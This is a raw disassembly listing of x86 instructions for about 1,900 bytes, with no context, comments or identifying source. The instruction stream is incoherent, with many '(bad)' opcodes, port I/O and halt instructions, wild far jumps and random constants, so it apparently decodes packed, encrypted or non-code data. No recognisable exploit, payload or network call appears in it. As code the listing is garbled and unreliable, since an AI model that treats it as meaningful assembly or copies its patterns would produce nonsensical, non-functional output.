  418996:	inc    edx
  418997:	and    eax,0x9f0fc0b1
  41899c:	adc    al,0x4b
  41899e:	sti    
  41899f:	outs   dx,BYTE PTR ds:[esi]
  4189a0:	inc    esi
  4189a1:	add    dh,cl
  4189a3:	xchg   BYTE PTR [esi-0x59],bh
  4189a6:	mov    ecx,0xbc3bc72b
  4189ab:	rcr    DWORD PTR [esi+0x78d0eed7],1
  4189b1:	sar    al,cl
  4189b3:	mov    al,ds:0xc5a4fa8e
  4189b8:	data16 jecxz 0x418949
  4189bb:	sub    al,0x19
  4189bd:	test   DWORD PTR [ebx+eiz*1],edx
  4189c0:	inc    edi
  4189c1:	aaa    
  4189c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189c3:	arpl   WORD PTR [ebp+0x7fc3218f],ax
  4189c9:	and    DWORD PTR [ecx],esp
  4189cb:	dec    DWORD PTR [esi]
  4189cd:	sbb    al,0x4
  4189cf:	sahf   
  4189d0:	inc    ecx
  4189d1:	imul   ebx,DWORD PTR [esi+esi*1],0x4e
  4189d5:	leave  
  4189d6:	mov    esp,0x604f14f5
  4189db:	cmp    ecx,DWORD PTR [edx+ecx*2+0x5e]
  4189df:	cmp    ch,BYTE PTR [esi+edi*2]
  4189e2:	je     0x4189f4
  4189e4:	es hlt 
  4189e6:	dec    ecx
  4189e7:	popa   
  4189e8:	and    ch,0xad
  4189eb:	lahf   
  4189ec:	sub    DWORD PTR [edi+0x2131bc45],esp
  4189f2:	pop    ebp
  4189f3:	inc    ebp
  4189f4:	sub    al,0x41
  4189f6:	nop
  4189f7:	mov    ebx,0x15cab71f
  4189fc:	fcom   QWORD PTR [edx-0x3a0847a3]
  418a02:	cs dec esi
  418a04:	sbb    ebx,DWORD PTR [edi-0x70e612c6]
  418a0a:	lds    ecx,FWORD PTR [esi-0x2ef43071]
  418a10:	ror    BYTE PTR [ecx-0x2af63415],1
  418a16:	in     eax,0x5d
  418a18:	fsubr  st,st(3)
  418a1a:	loop   0x4189a7
  418a1c:	push   ecx
  418a1d:	rcr    DWORD PTR ds:0x15cc787b,1
  418a23:	ret    
  418a24:	and    esp,edi
  418a26:	enter  0x954a,0x2c
  418a2a:	jo     0x4189de
  418a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a2d:	ins    BYTE PTR es:[edi],dx
  418a2e:	int    0x3b
  418a30:	lods   eax,DWORD PTR ds:[esi]
  418a31:	jne    0x4189f2
  418a33:	leave  
  418a34:	cld    
  418a35:	loopne 0x418a5d
  418a37:	pop    es
  418a38:	lods   al,BYTE PTR ds:[esi]
  418a39:	pop    esp
  418a3a:	jne    0x4189f9
  418a3c:	cmp    ecx,edx
  418a3e:	xor    eax,0x5c8bdc82
  418a43:	push   eax
  418a44:	dec    ebp
  418a45:	mov    cl,0x66
  418a47:	int    0x73
  418a49:	cld    
  418a4a:	loopne 0x4189e7
  418a4c:	inc    BYTE PTR [esi]
  418a4e:	push   edi
  418a4f:	sub    al,0xc1
  418a51:	aaa    
  418a52:	inc    eax
  418a53:	cmp    al,0x1b
  418a55:	(bad)  
  418a57:	dec    ebx
  418a58:	lahf   
  418a59:	jle    0x418ac0
  418a5b:	or     BYTE PTR [edi],ch
  418a5d:	push   esp
  418a5e:	add    eax,0x2066800e
  418a63:	outs   dx,BYTE PTR ds:[esi]
  418a64:	mov    ds:0xc46de0f3,al
  418a69:	inc    eax
  418a6a:	xchg   ebp,eax
  418a6b:	dec    esp
  418a6c:	pop    esi
  418a6d:	out    0x1c,al
  418a6f:	int3   
  418a70:	inc    ebp
  418a71:	(bad)  
  418a72:	xor    esi,esi
  418a74:	inc    edx
  418a75:	mov    al,0x1
  418a77:	jmp    0xff50:0x72ea5086
  418a7e:	adc    ecx,eax
  418a80:	andps  xmm6,XMMWORD PTR [eax]
  418a83:	out    0x48,al
  418a85:	sub    al,0xa4
  418a87:	or     eax,edx
  418a89:	add    al,0x3f
  418a8b:	cli    
  418a8c:	outs   dx,BYTE PTR ds:[esi]
  418a8d:	nop
  418a8e:	inc    DWORD PTR [edx-0x79a03950]
  418a94:	out    0x4a,eax
  418a96:	adc    al,0xe0
  418a98:	js     0x418a69
  418a9a:	mov    eax,ebx
  418a9c:	enter  0x23a0,0x96
  418aa0:	dec    ebx
  418aa1:	mov    esp,0x83aa995f
  418aa6:	int    0xa4
  418aa8:	mov    edi,DWORD PTR [ecx]
  418aaa:	hlt    
  418aab:	(bad)  
  418aac:	out    0x6,eax
  418aae:	sbb    al,0x30
  418ab0:	cld    
  418ab1:	mov    esp,0x7d185567
  418ab6:	or     bl,BYTE PTR [eax+0x5e1b672c]
  418abc:	dec    esi
  418abd:	mov    cl,0xac
  418abf:	push   cs
  418ac0:	arpl   WORD PTR [edi],bx
  418ac2:	xor    DWORD PTR [ebp+0x3f6689e8],edx
  418ac8:	test   bh,ah
  418aca:	dec    ebx
  418acb:	mov    edi,DWORD PTR [edx-0x33]
  418ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418acf:	push   cs
  418ad0:	xchg   ebx,eax
  418ad1:	popa   
  418ad2:	xor    eax,ebp
  418ad4:	sub    BYTE PTR [ecx+edi*1-0x4dcf9823],bl
  418adb:	cmp    al,cl
  418add:	push   esp
  418ade:	jp     0x418b20
  418ae0:	mov    cl,0xd6
  418ae2:	scas   eax,DWORD PTR es:[edi]
  418ae3:	leave  
  418ae4:	loope  0x418a92
  418ae6:	ds jmp 0x62f1fdb1
  418aec:	xchg   bh,bh
  418aee:	sbb    BYTE PTR [esi+0x74],dh
  418af1:	push   ds
  418af2:	jmp    0x5884:0x2c2bf3f3
  418af9:	addr16 int3 
  418afb:	fidiv  DWORD PTR [ebp-0x71f2d38c]
  418b01:	retf   
  418b02:	(bad)  
  418b03:	outs   dx,BYTE PTR ds:[esi]
  418b04:	inc    edx
  418b05:	fcomp  st(6)
  418b07:	dec    esp
  418b08:	sub    eax,0x1458424e
  418b0d:	pop    esi
  418b0e:	sti    
  418b0f:	clc    
  418b10:	loop   0x418b6e
  418b12:	lahf   
  418b13:	mov    ds:0x2ee224d8,eax
  418b18:	test   DWORD PTR [edi-0x41],esi
  418b1b:	sub    eax,0x4326ae13
  418b20:	in     al,0xc4
  418b22:	jne    0x418b20
  418b24:	stc    
  418b25:	test   eax,0x6c31e8ac
  418b2a:	jp     0x418b66
  418b2c:	sti    
  418b2d:	xchg   DWORD PTR [edi+ebx*4-0x5ad6dbd2],ebx
  418b34:	xor    al,0x2c
  418b36:	retf   
  418b37:	icebp  
  418b38:	xchg   ebp,eax
  418b39:	(bad)  
  418b3a:	clc    
  418b3b:	popf   
  418b3c:	inc    esp
  418b3d:	sar    DWORD PTR [ebx-0x42],cl
  418b40:	xchg   ecx,eax
  418b41:	xor    BYTE PTR [edi+0x6],0x4a
  418b45:	scas   al,BYTE PTR es:[edi]
  418b46:	jne    0x418bc7
  418b48:	and    esi,DWORD PTR [edi]
  418b4a:	cdq    
  418b4b:	neg    BYTE PTR [eax]
  418b4d:	xor    BYTE PTR [edx],al
  418b4f:	lock dec eax
  418b51:	mov    ecx,0x91cbd506
  418b56:	and    eax,0xeed511f7
  418b5b:	mov    ebx,0xb67301c4
  418b60:	inc    esp
  418b61:	and    BYTE PTR [edx],ah
  418b63:	retf   
  418b64:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b66:	or     eax,0x1c9d6d73
  418b6b:	mov    al,ds:0x2b37c31e
  418b70:	(bad)  
  418b71:	aas    
  418b72:	scas   eax,DWORD PTR es:[edi]
  418b73:	(bad)  
  418b74:	mov    BYTE PTR [edi-0x7cd6e81d],dh
  418b7a:	and    DWORD PTR [esp+ebp*4+0x7072cc8e],eax
  418b81:	or     esi,DWORD PTR [eax-0x7]
  418b84:	imul   esp,DWORD PTR [edi+edx*1+0x37cd5c52],0x4d
  418b8c:	stos   BYTE PTR es:[edi],al
  418b8d:	mov    ecx,0xdf77309a
  418b92:	pop    ss
  418b93:	ins    DWORD PTR es:[edi],dx
  418b94:	ret    0x7123
  418b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b98:	ss jge 0x418bf5
  418b9b:	sub    al,0x30
  418b9d:	pop    esi
  418b9e:	shl    BYTE PTR [esp+ecx*1-0x12],cl
  418ba2:	jnp    0x418bd5
  418ba4:	mov    edi,0x7eeab279
  418ba9:	mov    esp,0xe321dba7
  418bae:	pop    es
  418baf:	inc    edi
  418bb0:	in     al,0xbf
  418bb2:	shl    BYTE PTR [ebx],cl
  418bb4:	arpl   WORD PTR [esi],sp
  418bb6:	jnp    0x418b7e
  418bb8:	adc    DWORD PTR [edi-0x9c64d79],esp
  418bbe:	out    dx,eax
  418bbf:	and    ebx,DWORD PTR [eax+edx*2]
  418bc2:	test   BYTE PTR [ebx-0x3959e9ed],ah
  418bc8:	adc    ebp,DWORD PTR [ebp-0x1d5c2dfa]
  418bce:	sar    BYTE PTR [ebx-0x7a42c864],1
  418bd4:	pushf  
  418bd5:	pop    ebx
  418bd6:	sbb    eax,0x91de1b12
  418bdb:	and    eax,0x561583b9
  418be0:	test   DWORD PTR [edx+0x1426c23b],esi
  418be6:	jp     0x418b75
  418be8:	pop    esp
  418be9:	ins    BYTE PTR es:[edi],dx
  418bea:	loopne 0x418bef
  418bec:	(bad)  [ecx]
  418bee:	push   edx
  418bef:	or     eax,0xca6df4fe
  418bf4:	inc    edx
  418bf5:	add    al,0xd3
  418bf7:	pop    esp
  418bf8:	mov    eax,0x259f2f54
  418bfd:	retf   0x6e9c
  418c00:	iret   
  418c01:	lea    ecx,[ecx+0x56]
  418c04:	popa   
  418c05:	jne    0x418beb
  418c07:	xchg   ebx,eax
  418c08:	pushf  
  418c09:	xchg   ebp,eax
  418c0a:	cs dec esi
  418c0c:	push   es
  418c0d:	outs   dx,DWORD PTR ds:[esi]
  418c0e:	lea    ebp,[edx]
  418c10:	loopne 0x418be2
  418c12:	or     esi,ebp
  418c14:	int    0x54
  418c16:	rcl    DWORD PTR [ebx+0x32aa2681],1
  418c1c:	lock cbw 
  418c1f:	cwde   
  418c20:	pop    ebp
  418c21:	inc    BYTE PTR [edx]
  418c23:	stc    
  418c24:	mov    gs,WORD PTR [edi+edx*8]
  418c27:	mov    ecx,0x8369d3e5
  418c2c:	jle    0x418bff
  418c2e:	out    0xb1,al
  418c30:	nop
  418c31:	mov    ebx,0xa221e55a
  418c36:	data16 loopne 0x418bc0
  418c39:	imul   esi,DWORD PTR [ebx-0x7c],0x92606f47
  418c40:	fistp  QWORD PTR [eax]
  418c42:	dec    ebp
  418c43:	ficomp DWORD PTR [edi]
  418c45:	add    BYTE PTR [ecx+0x1c1d10d2],bh
  418c4b:	push   edx
  418c4c:	push   cs
  418c4d:	sahf   
  418c4e:	out    0xf,al
  418c50:	mov    DWORD PTR [ebx+0x13],esi
  418c53:	xor    esp,0xddfc66bb
  418c59:	arpl   WORD PTR [edi],bp
  418c5b:	(bad)  
  418c5c:	enter  0xaf6f,0xfc
  418c60:	lea    esi,[ebx-0x134826e9]
  418c66:	sub    eax,0x685ad91e
  418c6b:	lea    esi,[eax-0x60]
  418c6e:	jno    0x418bfa
  418c70:	push   esi
  418c71:	les    ebx,FWORD PTR [ebx+0xe3bb326]
  418c77:	sub    edi,DWORD PTR [esp+ecx*1]
  418c7a:	sbb    DWORD PTR [edx+0x52],edi
  418c7d:	test   al,0x93
  418c7f:	lods   eax,DWORD PTR ds:[esi]
  418c80:	outs   dx,BYTE PTR ds:[esi]
  418c81:	or     dl,BYTE PTR [edi+0xd]
  418c84:	xlat   BYTE PTR ds:[ebx]
  418c85:	je     0x418c53
  418c87:	rcl    BYTE PTR [esi+0x5d00a30d],cl
  418c8d:	sahf   
  418c8e:	ret    
  418c8f:	mov    eax,ds:0xb8788d92
  418c94:	lods   al,BYTE PTR ds:[esi]
  418c95:	sar    BYTE PTR es:[ecx+0x6e],0x85
  418c9a:	cmp    al,0x59
  418c9c:	xchg   BYTE PTR [ebx+0x2e],bh
  418c9f:	lods   eax,DWORD PTR ds:[esi]
  418ca0:	fild   DWORD PTR [ebp+edi*4+0x6c191cd1]
  418ca7:	or     BYTE PTR [edi+0x203c0a31],dl
  418cad:	inc    ebx
  418cae:	es inc ebx
  418cb0:	mov    bh,0x45
  418cb2:	pop    edi
  418cb3:	cs outs dx,DWORD PTR es:[esi]
  418cb6:	and    bh,BYTE PTR [edx]
  418cb8:	mov    dh,0x3a
  418cba:	mov    eax,0xe4b663a1
  418cbf:	ja     0x418cf2
  418cc1:	xor    BYTE PTR [edi+0x77aacdd2],0x73
  418cc8:	sbb    eax,0x35bdae2d
  418ccd:	jg     0x418cbd
  418ccf:	add    al,bl
  418cd1:	(bad)  
  418cd3:	and    eax,DWORD PTR [edi-0x76f2fe29]
  418cd9:	add    bl,bh
  418cdb:	jb     0x418d1a
  418cdd:	outs   dx,BYTE PTR ds:[esi]
  418cde:	in     eax,dx
  418cdf:	pop    ebx
  418ce0:	pop    ebp
  418ce1:	add    bh,BYTE PTR [ecx-0x18]
  418ce4:	mov    al,0xb6
  418ce6:	push   eax
  418ce7:	(bad)  
  418ce8:	mov    esp,0xc358fbcc
  418ced:	retf   0xc79
  418cf0:	pop    ds
  418cf1:	add    edx,DWORD PTR [ecx]
  418cf3:	in     eax,0xb6
  418cf5:	inc    edi
  418cf6:	and    BYTE PTR [edi-0x712099f],bl
  418cfc:	push   edx
  418cfd:	mov    esp,ecx
  418cff:	and    DWORD PTR [edx+0x147c7c9b],eax
  418d05:	mov    cl,0xd6
  418d07:	loop   0x418d1f
  418d09:	jne    0x418d7b
  418d0b:	aaa    
  418d0c:	adc    esi,DWORD PTR ds:0xb07ad4d2
  418d12:	dec    esi
  418d13:	pusha  
  418d14:	fnsave [edx+ebx*8]
  418d17:	push   edx
  418d18:	xchg   esi,eax
  418d19:	mov    BYTE PTR [ebx-0x3c],bh
  418d1c:	dec    ecx
  418d1d:	clc    
  418d1e:	adc    BYTE PTR [ebx+eiz*4],al
  418d21:	cdq    
  418d22:	pushf  
  418d23:	push   ebx
  418d24:	fld    DWORD PTR [edi-0x468e8763]
  418d2a:	mov    ds:0x2d7ad180,al
  418d2f:	sub    DWORD PTR [ebx],ebx
  418d31:	xor    eax,ecx
  418d33:	mov    al,ds:0x5f6be8c3
  418d38:	xchg   edi,eax
  418d39:	xchg   ebp,eax
  418d3a:	jo     0x418d0f
  418d3c:	outs   dx,BYTE PTR ds:[esi]
  418d3d:	mov    ecx,0x4e3ad28f
  418d42:	sti    
  418d43:	mov    edx,0xdb287bed
  418d48:	xlat   BYTE PTR ds:[ebx]
  418d49:	les    eax,FWORD PTR ds:0x12179209
  418d4f:	jnp    0x418d50
  418d51:	aad    0x32
  418d53:	sar    ah,0xfc
  418d56:	pop    esi
  418d57:	mov    bl,0x95
  418d59:	cwde   
  418d5a:	pop    eax
  418d5b:	test   DWORD PTR [esi-0x43],eax
  418d5e:	cmp    ebp,esp
  418d60:	outs   dx,DWORD PTR ds:[esi]
  418d61:	adc    al,0x46
  418d63:	sahf   
  418d64:	sub    BYTE PTR [ecx],cl
  418d66:	sbb    eax,0xbbc86341
  418d6b:	aam    0x8a
  418d6d:	pop    esi
  418d6e:	pusha  
  418d6f:	ret    
  418d70:	in     eax,0x4c
  418d72:	fdivrp st(5),st
  418d74:	adc    DWORD PTR [eax-0x7d],esp
  418d77:	ja     0x418d17
  418d79:	adc    ecx,ecx
  418d7b:	pop    eax
  418d7c:	add    dh,bh
  418d7e:	(bad)  
  418d80:	das    
  418d81:	jne    0x418d0e
  418d83:	push   0x62
  418d85:	jp     0x418db4
  418d87:	iret   
  418d88:	mov    ds:0xcdf3367a,eax
  418d8d:	xchg   esp,eax
  418d8e:	push   esi
  418d8f:	enter  0x699d,0x13
  418d93:	lea    ebp,[edi+0x43c859a7]
  418d99:	add    BYTE PTR [ebx-0x12],0x15
  418d9d:	fisubr DWORD PTR [esi-0x24]
  418da0:	stc    
  418da1:	shr    DWORD PTR [eax-0x31423601],0xb6
  418da8:	xor    bl,bl
  418daa:	add    BYTE PTR [esi+0x2fd7abfb],bh
  418db0:	fwait
  418db1:	cmp    BYTE PTR [esi+0x3d3beb24],bh
  418db7:	jge    0x418e09
  418db9:	pop    ecx
  418dba:	pop    edx
  418dbb:	fs ret 
  418dbd:	addr16 es push 0xffffff93
  418dc1:	in     al,0x51
  418dc3:	and    eax,0x564956f0
  418dc8:	mov    bl,0x50
  418dca:	add    ebx,ecx
  418dcc:	lods   al,BYTE PTR ds:[esi]
  418dcd:	mov    esi,0x8100ec13
  418dd2:	jmp    FWORD PTR [edx+0x2382097a]
  418dd8:	shl    eax,1
  418dda:	int3   
  418ddb:	or     edi,ebx
  418ddd:	fidiv  DWORD PTR [ecx-0x633dd1e3]
  418de3:	mov    BYTE PTR [edx-0x4c],bh
  418de6:	jp     0x418e03
  418de8:	and    BYTE PTR [ecx],ch
  418dea:	bound  esi,QWORD PTR [edi]
  418dec:	sub    DWORD PTR [eax],edi
  418dee:	outs   dx,BYTE PTR ds:[esi]
  418def:	mov    WORD PTR [ebp+0x28],ss
  418df2:	bound  esi,QWORD PTR ds:0xe72b83db
  418df8:	cmp    al,0xe7
  418dfa:	fist   DWORD PTR [edi-0x5c1367df]
  418e00:	jmp    FWORD PTR [edi]
  418e02:	push   es
  418e03:	sbb    DWORD PTR [ebp+0x49],ecx
  418e06:	or     eax,0x61d91059
  418e0b:	cmp    al,0xc9
  418e0d:	ficom  WORD PTR [edx]
  418e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e10:	mov    fs,WORD PTR [ecx]
  418e12:	xchg   edx,eax
  418e13:	and    DWORD PTR [edx-0x47],eax
  418e16:	inc    esp
  418e17:	push   esp
  418e18:	retf   
  418e19:	loope  0x418dd5
  418e1b:	repz pusha 
  418e1d:	and    eax,0x5772e49a
  418e22:	dec    edx
  418e23:	cs in  eax,0xb
  418e26:	fndisi(8087 only) 
  418e28:	jnp    0x418e48
  418e2a:	mov    bh,0x63
  418e2c:	(bad)  
  418e2d:	(bad)  
  418e2f:	ret    0x6b54
  418e32:	inc    edx
  418e33:	out    dx,al
  418e34:	or     bl,BYTE PTR [ebp-0x7e]
  418e37:	rcr    dh,0xae
  418e3a:	pop    eax
  418e3b:	push   cs
  418e3c:	jns    0x418e74
  418e3e:	pop    ebx
  418e3f:	clc    
  418e40:	xor    BYTE PTR [eax-0x709a0622],dl
  418e46:	pusha  
  418e47:	push   0xb74a5f25
  418e4c:	add    ecx,DWORD PTR [edi-0x6b]
  418e4f:	out    0x8f,al
  418e51:	(bad)  
  418e52:	pop    esp
  418e53:	xchg   esp,eax
  418e54:	or     DWORD PTR [eax],eax
  418e56:	ins    BYTE PTR es:[edi],dx
  418e57:	imul   ecx,DWORD PTR [eax-0x2a],0xffffffcc
  418e5b:	dec    DWORD PTR [esi]
  418e5d:	and    ebp,esi
  418e5f:	pop    edi
  418e60:	and    dl,BYTE PTR [ebx]
  418e62:	dec    esp
  418e63:	jae    0x418e6f
  418e65:	gs dec ebx
  418e67:	sbb    DWORD PTR [edx+0x3a],ebx
  418e6a:	clc    
  418e6b:	xchg   edx,eax
  418e6c:	sbb    ebp,DWORD PTR [edi-0x413ec4c2]
  418e72:	jmp    0x3aeb4624
  418e77:	sbb    esp,eax
  418e79:	xchg   esp,eax
  418e7a:	sub    eax,0xb1a4df9a
  418e7f:	dec    ecx
  418e80:	lock push 0x30fd21f9
  418e86:	adc    bh,BYTE PTR [edi-0x6b]
  418e89:	inc    edx
  418e8a:	imul   ecx,DWORD PTR [edi-0x75],0x75805bbd
  418e91:	mov    ds:0x6020ce2b,al
  418e96:	call   0x200e1c31
  418e9b:	inc    DWORD PTR [ebx-0xc]
  418e9e:	fwait
  418e9f:	int3   
  418ea0:	jb     0x418e76
  418ea2:	ror    BYTE PTR [ebx+0x20],cl
  418ea5:	add    eax,0x37669939
  418eaa:	sbb    eax,0xce7cd1f
  418eaf:	int    0xb9
  418eb1:	aam    0x6f
  418eb3:	adc    al,0x64
  418eb5:	xor    eax,0xd0c1d339
  418eba:	into   
  418ebb:	shr    DWORD PTR [esi+0x54e4b67b],cl
  418ec1:	push   es
  418ec2:	xchg   edi,eax
  418ec3:	pop    eax
  418ec4:	mov    esp,0x35ca79a
  418ec9:	test   BYTE PTR [ecx],bl
  418ecb:	daa    
  418ecc:	jnp    0x418e75
  418ece:	daa    
  418ecf:	gs jl  0x418e52
  418ed2:	mov    ecx,0x967cdfb2
  418ed7:	sub    al,0x2
  418ed9:	in     eax,dx
  418eda:	inc    ecx
  418edb:	int3   
  418edc:	sub    ecx,edi
  418ede:	daa    
  418edf:	xor    dl,0xa7
  418ee2:	(bad)  
  418ee3:	push   ss
  418ee4:	dec    edx
  418ee5:	(bad)  
  418ee6:	xchg   esp,eax
  418ee7:	mov    edi,0xc6d89ecc
  418eec:	mov    ebx,edi
  418eee:	push   ebx
  418eef:	xchg   ebp,eax
  418ef0:	cmc    
  418ef1:	scas   al,BYTE PTR es:[edi]
  418ef2:	setb   BYTE PTR [edx+0x6f]
  418ef6:	stc    
  418ef7:	sub    DWORD PTR [ebp+0x1f6db639],eax
  418efd:	clc    
  418efe:	xchg   ebx,eax
  418eff:	ja     0x418ecd
  418f01:	jp     0x418ec9
  418f03:	inc    edx
  418f04:	xchg   esi,eax
  418f05:	ins    DWORD PTR es:[edi],dx
  418f06:	add    dl,dl
  418f08:	and    ch,0xc7
  418f0b:	rol    BYTE PTR [edi+esi*1-0x5e],cl
  418f0f:	mov    edi,0xae7ba127
  418f14:	adc    edx,DWORD PTR [edi]
  418f16:	cs sub eax,0x3d96fb8f
  418f1c:	pop    ebx
  418f1d:	mov    al,0x42
  418f1f:	nop
  418f20:	in     al,dx
  418f21:	mov    edx,0xd45391aa
  418f26:	sub    bh,ch
  418f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f29:	jno    0x418f40
  418f2b:	loop   0x418edf
  418f2d:	jmp    0x9183f9bd
  418f32:	mov    eax,0x9b141b41
  418f37:	iret   
  418f38:	fisttp QWORD PTR [eax+esi*4+0x194649f2]
  418f3f:	pop    ss
  418f40:	xchg   ecx,eax
  418f41:	dec    ebp
  418f43:	mov    WORD PTR [ecx],ss
  418f45:	cmp    BYTE PTR [eax],al
  418f47:	out    0x84,al
  418f49:	daa    
  418f4a:	dec    edi
  418f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f4c:	push   ss
  418f4d:	mov    WORD PTR [edi-0x10ca47cc],fs
  418f53:	mov    dh,0xaa
  418f55:	(bad)  
  418f56:	inc    edi
  418f57:	idiv   dl
  418f59:	jp     0x418fc3
  418f5b:	jb     0x418fba
  418f5d:	addr16 out 0x6a,al
  418f60:	daa    
  418f61:	jnp    0x418faa
  418f63:	mov    edi,DWORD PTR [esi+esi*1+0x4c47fe3d]
  418f6a:	cdq    
  418f6b:	dec    ebx
  418f6c:	fsubp  st(3),st
  418f6e:	xchg   edx,eax
  418f6f:	ret    
  418f70:	out    dx,al
  418f71:	inc    esi
  418f72:	mov    edx,0xa01b2096
  418f77:	lods   al,BYTE PTR ds:[esi]
  418f78:	mov    edi,0x7c0f79e4
  418f7d:	cmp    eax,DWORD PTR [ebx]
  418f7f:	neg    DWORD PTR [ecx]
  418f81:	add    al,0x28
  418f83:	pop    eax
  418f84:	cdq    
  418f85:	and    edx,DWORD PTR [ebx-0x30]
  418f88:	ror    ch,cl
  418f8a:	jge    0x418f3b
  418f8c:	outs   dx,DWORD PTR ds:[esi]
  418f8d:	add    bl,bl
  418f8f:	jns    0x418f57
  418f91:	sub    BYTE PTR [ebp-0x38],0x41
  418f95:	lock cmp al,0xa2
  418f98:	aaa    
  418f99:	jecxz  0x418f22
  418f9b:	xchg   DWORD PTR [eax-0x4781a676],edx
  418fa1:	dec    ebx
  418fa2:	and    BYTE PTR [edi-0x7ca67868],0x62
  418fa9:	mov    al,0xe3
  418fac:	outs   dx,BYTE PTR ds:[esi]
  418fae:	sbb    edx,edx
  418fb0:	add    DWORD PTR [eax+0x38500666],esi
  418fb6:	daa    
  418fb7:	ds cli 
  418fb9:	clc    
  418fba:	int    0x6
  418fbc:	sbb    eax,0xb4502ab9
  418fc1:	or     edi,DWORD PTR [esi-0x70ae3b0f]
  418fc7:	jo     0x418f79
  418fc9:	xor    eax,0xd1a1c5b4
  418fce:	fnstenv [edi-0x5afd3d62]
  418fd4:	call   0x7e2f1d65
  418fd9:	lea    edi,[edx+ecx*1+0x55ed79b0]
  418fe0:	xchg   DWORD PTR [esi],edi
  418fe2:	jb     0x419022
  418fe4:	mov    BYTE PTR [edi+edi*4+0x33e209c2],ah
  418feb:	loop   0x418f78
  418fed:	cwde   
  418fee:	hlt    
  418fef:	(bad)
  418ff4:	xor    BYTE PTR [ebx+0x53de85f8],dl
  418ffa:	mov    al,0x75
  418ffc:	(bad)  
  418ffd:	je     0x418fd2
  418fff:	(bad)  
  419000:	pop    esi
  419001:	sbb    eax,ecx
  419003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419004:	and    al,BYTE PTR fs:[ebx-0x6c]
  419008:	ret    
  419009:	in     al,0xb9
  41900b:	cmp    BYTE PTR [ebx+0x19c04f4a],al
  419011:	dec    esp
  419012:	inc    esi
  419013:	popf   
  419014:	lods   eax,DWORD PTR ds:[esi]
  419015:	jle    0x41908d
  419017:	loop   0x419077
  419019:	xchg   ebp,eax
  41901a:	sbb    ebp,DWORD PTR [edi+0x37]
  41901d:	sbb    cl,BYTE PTR ds:0xc932f7bc
  419023:	repnz mov bh,0xc
  419026:	test   bh,al
  419028:	mov    ebp,0xd4cf12a2
  41902d:	or     esi,DWORD PTR [esi+0xf2b815]
  419033:	icebp  
  419034:	test   al,0xd6
  419036:	std    
  419037:	pop    ebp
  419038:	jb     0x418ffc
  41903a:	inc    edi
  41903b:	inc    esp
  41903c:	adc    bl,BYTE PTR [edx-0x1c]
  41903f:	fmulp  st(7),st
  419041:	pop    ebp
  419042:	lahf   
  419043:	in     al,dx
  419044:	cld    
  419045:	(bad)  
  419046:	pop    esp
  419047:	mov    WORD PTR [edi+0x41],fs
  41904a:	adc    ebx,edx
  41904c:	stos   BYTE PTR es:[edi],al
  41904d:	retf   0xa7be
  419050:	test   DWORD PTR [edi],edx
  419052:	cdq    
  419053:	loope  0x419095
  419055:	ficom  DWORD PTR [ecx]
  419057:	lds    eax,FWORD PTR [ebx]
  419059:	lahf   
  41905a:	or     eax,0x5387ee29
  41905f:	or     ch,BYTE PTR [edi+0x582b417d]
  419065:	or     eax,0x65163cef
  41906a:	loopne 0x418ff5
  41906c:	je     0x41901a
  41906e:	ret    
  41906f:	call   0xdfcb:0xc541bc45
  419076:	mov    edi,0xda7abe2f
  41907b:	test   al,0x40
  41907d:	push   0x981fdcd7
  419082:	xchg   esp,eax
  419083:	nop
  419084:	ret    
  419085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419086:	mov    cl,0xfa
  419088:	outs   dx,DWORD PTR ds:[esi]
  419089:	stc    
  41908a:	outs   dx,DWORD PTR ds:[esi]
  41908b:	aaa    
  41908c:	xchg   edx,eax
  41908d:	scas   eax,DWORD PTR es:[edi]
  41908e:	mov    edx,0x7f6f6e86
  419093:	out    0xdd,al
  419095:	sbb    eax,0xbed594fd
  41909a:	sti    
  41909b:	jns    0x41906b
  41909d:	jb     0x419095
  41909f:	in     al,dx
  4190a0:	xchg   esp,eax
  4190a1:	sub    DWORD PTR [esi],0xffffff94
  4190a4:	sbb    edx,DWORD PTR [edx-0x5]
  4190a7:	inc    edi
  4190a8:	inc    eax
  4190a9:	jmp    0x3b6de3ac
  4190ae:	add    al,0x69
  4190b0:	out    0x52,eax
  4190b2:	xor    al,0xa0
  4190b4:	test   al,0xab
  4190b6:	out    dx,eax
  4190b7:	out    0xa9,eax
  4190b9:	aas    
  4190ba:	call   FWORD PTR [ecx]
  4190bc:	dec    edi
  4190bd:	mov    esi,0x5b5b80f6
  4190c2:	shl    DWORD PTR [edx-0x1fb9f967],0x0
  4190c9:	inc    ecx
  4190ca:	pop    ebx
  4190cb:	clc    
  4190cc:	int    0xc6
  4190ce:	ret    0xdd6f
  4190d1:	jle    0x4190d9
  4190d3:	mov    eax,0xcfef4d0f
  4190d8:	inc    ebp
  4190d9:	mov    dh,0xbe
  4190db:	jmp    0x4190f7
  4190dd:	adc    BYTE PTR [esi],dh
  4190df:	jg     0x4190c4
  4190e1:	xor    eax,0xf23f56c2
  4190e6:	inc    eax
  4190e7:	addr16 cdq 
  4190e9:	(bad)  
  4190ea:	push   0x23a78209
  4190ef:	loope  0x41913f
  4190f1:	sub    al,0x6d
  4190f3:	les    ebp,FWORD PTR [esi+0x52e339d6]
  4190f9:	mov    ds:0x6cd5d391,eax
  4190fe:	pop    edi
  4190ff:	aad    0xdf
  419101:	mov    esi,ecx
  419103:	push   ecx
  419104:	sti    
  419105:	push   ds
  419106:	stos   BYTE PTR es:[edi],al
  419107:	mov    es,WORD PTR [eax-0xd]
  41910a:	add    ecx,DWORD PTR [ebp-0x6f]
  41910d:	sub    al,0xec
  41910f:	jno    0x4190fd
  419111:	adc    BYTE PTR [edi],ch
  419113:	loop   0x419140
  419115:	mov    WORD PTR [edx-0x6400f80],cs
  41911b:	add    edx,DWORD PTR [edx]
  41911d:	mov    ebx,0xf4eecc6c
  419123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419124:	fs shr eax,1
  419127:	in     eax,0x87
  419129:	or     ebx,DWORD PTR ds:0x8c1bc001
  41912f:	inc    edx
  419130:	inc    esi
  419131:	adc    eax,edx
  419133:	and    al,0xcd
